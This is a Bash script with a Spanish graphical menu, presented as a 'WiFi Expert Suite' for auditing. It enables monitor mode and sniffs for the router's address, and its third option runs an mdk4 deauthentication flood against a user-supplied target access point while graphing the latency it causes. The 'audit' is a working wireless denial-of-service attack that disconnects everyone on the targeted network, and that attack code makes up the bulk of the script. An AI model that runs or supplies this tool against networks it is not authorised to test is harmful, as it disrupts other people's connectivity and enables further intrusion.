#!/bin/bash
# WiFi Expert Suite v2.0
REPORT_DIR="$HOME/WiFi_Audit_Lab"
mkdir -p "$REPORT_DIR"

CYAN='\033[0;36m'; YELLOW='\033[1;33m'; GREEN='\033[0;32m'; NC='\033[0m'

monitor_salud() {
    local ip=$1; local t=$2
    echo -e "${GREEN}[+] Monitoreando IP: $ip...${NC}"
    for i in $(seq 1 $t); do
        LAT=$(ping -c 1 -W 1 $ip | grep 'time=' | awk -F'time=' '{print $2}' | cut -d' ' -f1)
        if [ -z "$LAT" ]; then
            echo -e "Segundo $i: TIMEOUT"; echo "$i 1000" >> "$REPORT_DIR/puntos.dat"
        else
            echo -e "Segundo $i: $LAT ms"; echo "$i $LAT" >> "$REPORT_DIR/puntos.dat"
        fi
        sleep 1
    done
}

while true; do
    CHOICE=$(zenity --list --title="WiFi Expert Suite v2.0" \
        --column="ID" --column="Herramienta" --width=450 --height=400 \
        1 "⚡ Activar Modo Monitor" \
        2 "🔍 Buscar IP del Router (Sniffer Pasivo)" \
        3 "🔥 Lanzar Auditoría + Gráficos" \
        4 "❌ Salir")

    case $CHOICE in
        1) pkexec airmon-ng start wlan0 ;;
        2) gnome-terminal --title="SNIFFER" -- sh -c "echo -e '${CYAN}[+] Buscando Gateway...${NC}'; sudo netdiscover -p -i wlan0mon; exec bash" ;;
        3)
            BSSID=$(zenity --entry --text="MAC (BSSID) del Objetivo:")
            IP_R=$(zenity --entry --text="IP del Router:" --entry-text="192.168.1.1")
            TIME=$(zenity --scale --text="Duración (Segundos):" --min-value=10 --max-value=300 --value=30)
            echo "# Seg Lat" > "$REPORT_DIR/puntos.dat"
            gnome-terminal --title="MONITOR" -- sh -c "$(declare -f monitor_salud); monitor_salud $IP_R $TIME; exec bash" &
            (mdk4 wlan0mon d -b <(echo $BSSID) & P=$!; sleep $TIME; kill $P) | zenity --progress --auto-close
            gnuplot -e "set terminal png; set output '$REPORT_DIR/grafico.png'; plot '$REPORT_DIR/puntos.dat' with lines title 'Latencia'"
            viewnior "$REPORT_DIR/grafico.png" & ;;
        4) exit ;;
    esac
done
